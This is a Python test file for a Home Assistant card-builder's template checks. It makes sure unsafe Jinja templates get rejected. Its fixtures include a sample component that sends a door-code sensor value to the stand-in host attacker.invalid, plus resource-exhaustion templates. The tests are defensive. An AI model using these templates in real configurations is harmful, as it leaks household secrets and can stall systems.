"""Tests for the static template checks in the maker package."""

import time
from pathlib import Path

import pytest
import yaml

from custom_components.apollo_tab.maker.errors import MakerError
from custom_components.apollo_tab.maker.schema import validate_component
from custom_components.apollo_tab.maker.templates import (
    check_component_templates,
    check_data_template,
    check_template,
)

BUILTIN_COMPONENTS_DIR = (
    Path(__file__).parent.parent
    / "custom_components"
    / "apollo_tab"
    / "library"
    / "components"
)

EXFIL_COMPONENT = """\
id: community/radio
version: 1.0.0
name: Radio
size: 1x1
params:
  entity: {domain: media_player}
inputs:
  state: "{{ states(entity) }}"
outputs:
  play:
    action: media_player.play_media
    data:
      entity_id: "{{ entity }}"
      media_content_type: music
      media_content_id:
        "http://attacker.invalid/a.mp3?c={{ states('sensor.door_code') }}"
    feedback: optimistic
layout:
  - type: button
    text: Play
    on_tap: play
"""

REGEX_INPUT_COMPONENT = """\
id: me/regex
version: 1.0.0
name: Regex
size: 1x1
params:
  entity: {domain: light}
inputs:
  state: "{{ states(entity) | regex_replace('a', 'b') }}"
outputs:
  toggle:
    action: light.toggle
    data: {entity_id: "{{ entity }}"}
    feedback: optimistic
layout:
  - type: switch
    value: state
    on_tap: toggle
"""


def test_builtin_components_pass() -> None:
    """Every built-in Component passes the static template checks."""
    files = sorted(BUILTIN_COMPONENTS_DIR.glob("*.yaml"))
    assert len(files) == 16
    for path in files:
        for doc in yaml.safe_load_all(path.read_text(encoding="utf-8")):
            component = validate_component(doc)
            check_component_templates(component)


@pytest.mark.parametrize(
    "text",
    [
        "{{ x ",
        "{% macro m() %}{% endmacro %}",
        "{% call m() %}{% endcall %}",
        "{% import 'x' as y %}",
        "{% from 'x' import y %}",
        "{% include 'x' %}",
        "{% extends 'x' %}",
        "{% block b %}{% endblock %}",
        "{% for x in y recursive %}{{ loop(x) }}{% endfor %}",
        "{{ x | regex_replace('a', 'b') }}",
        "{{ x | format(1) }}",
        "{{ x | pack('>I') }}",
        "{{ x | apply(y) }}",
        "{% filter regex_replace('a', 'b') %}x{% endfilter %}",
        "{{ x is match('a') }}",
        "{{ lipsum(5) }}",
        "{{ '{:9}'.format(1) }}",
        "{{ x.format_map(y) }}",
        "{{ x.translate(y) }}",
        "{{ x.expandtabs(9) }}",
    ],
)
def test_check_template_rejects(text: str) -> None:
    """Reject templates that cannot parse or use unavailable features."""
    with pytest.raises(MakerError) as excinfo:
        check_template(text, "t")
    assert excinfo.value.code == "bad_template"


@pytest.mark.parametrize(
    ("text", "fragment"),
    [
        (
            "{% macro m() %}{% endmacro %}",
            "macros, imports, includes and blocks are not available in Components",
        ),
        (
            "{% for x in y recursive %}{{ loop(x) }}{% endfor %}",
            "recursive loops are not available in Components",
        ),
        (
            "{{ x | regex_match('a') }}",
            "the regex_match filter is not available in Components",
        ),
        ("{{ x is match('a') }}", "the match test is not available in Components"),
        ("{{ lipsum(5) }}", "lipsum is not available in Components"),
        ("{{ '{:9}'.format(1) }}", "the format method is not available in Components"),
    ],
)
def test_check_template_reject_messages(text: str, fragment: str) -> None:
    """Explain why each rejected feature is not available."""
    with pytest.raises(MakerError) as excinfo:
        check_template(text, "t")
    assert fragment in excinfo.value.message


@pytest.mark.parametrize(
    "text",
    [
        "{{ 9**9999999 }}",
        "{{ ('%9' ~ '99999999d') % 1 }}",
    ],
)
def test_check_template_is_fast(text: str) -> None:
    """Return in under a second; parsing never evaluates anything."""
    start = time.perf_counter()
    check_template(text, "t")
    assert time.perf_counter() - start < 1


@pytest.mark.parametrize("depth", [150, 480])
def test_check_template_rejects_deep_nesting(depth: int) -> None:
    """Reject templates nested so deeply the parser runs out of stack."""
    text = "{{ " + "(" * depth + "1" + ")" * depth + " }}"
    with pytest.raises(MakerError) as excinfo:
        check_template(text, "t")
    assert excinfo.value.code == "bad_template"
    assert "nests too deeply" in excinfo.value.message


@pytest.mark.parametrize(
    "text",
    [
        "{{ x * 100 }}",
        "{{ state_attr(entity, 'brightness') | int(0) * 100 // 255 }}",
        "{{ x * 2.55 }}",
        "{{ 2 * 3 }}",
        "{{ x * 3600.0 }}",
        "{{ x | replace('_', ' ') }}",
        "{{ ((x | float) * 100) | int * 2 }}",
        "{{ -5 }}",
        "plain text",
        # Bounded while rendering (see sandbox.py), not by these checks.
        "{{ 9**9999999 }}",
        "{{ 'a'*300000000 }}",
        "{{ [1] * 3 }}",
        "{{ 2 * 3 * 4 }}",
        "{{ x * 1000000 }}",
        "{{ x * 100 * 2 }}",
        "{{ '%999999999s' % 1 }}",
        "{{ x | replace('a', 'bb') }}",
        "{{ x.replace('a', 'bb') }}",
        "{{ x | replace(y, '') }}",
        "{{ ('%9' ~ '99999999d') % 1 }}",
        "{{ 'x' | center(30000 * 30000) }}",
        "{% set n = 100000 %}{{ 'x'.center(n * n) }}",
        "{% filter upper %}x{% endfilter %}",
    ],
)
def test_check_template_accepts(text: str) -> None:
    """Allow ordinary templates; runtime limits bound the costly ones."""
    check_template(text, "t")


@pytest.mark.parametrize(
    "text",
    [
        "{{ value }}",
        "{{ value | float / 100 }}",
        "{{ entity }}",
        "{{ value | round(1) }}",
        "{{ 'on' if value > 50 else 'off' }}",
    ],
)
def test_data_template_accepts(text: str) -> None:
    """Allow data templates over the card's own values."""
    check_data_template(text, "t", {"entity", "value"})


@pytest.mark.parametrize(
    "text",
    [
        "{{ states('sensor.door_code') }}",
        "http://attacker.invalid/a.mp3?c={{ states('sensor.door_code') }}",
        "{{ states.sensor.door_code.state }}",
        "{% if value %}on{% endif %}",
        "{{ value | regex_replace('a', 'b') }}",
        "{{ value is match('a') }}",
        "{{ entity.split('.') }}",
        "{{ now() }}",
    ],
)
def test_data_template_rejects(text: str) -> None:
    """Reject data templates that reach beyond the card's own values."""
    with pytest.raises(MakerError) as excinfo:
        check_data_template(text, "t", {"entity", "value"})
    assert excinfo.value.code == "bad_template"


def test_check_component_templates_blocks_state_leak() -> None:
    """Reject a service data template that reads another entity."""
    component = validate_component(yaml.safe_load(EXFIL_COMPONENT))
    with pytest.raises(MakerError) as excinfo:
        check_component_templates(component)
    assert excinfo.value.code == "bad_template"
    assert excinfo.value.path == "outputs.play.data.media_content_id"


def test_check_component_templates_reports_input_path() -> None:
    """Report the dotted path of a failing input template."""
    component = validate_component(yaml.safe_load(REGEX_INPUT_COMPONENT))
    with pytest.raises(MakerError) as excinfo:
        check_component_templates(component)
    assert excinfo.value.code == "bad_template"
    assert excinfo.value.path == "inputs.state"
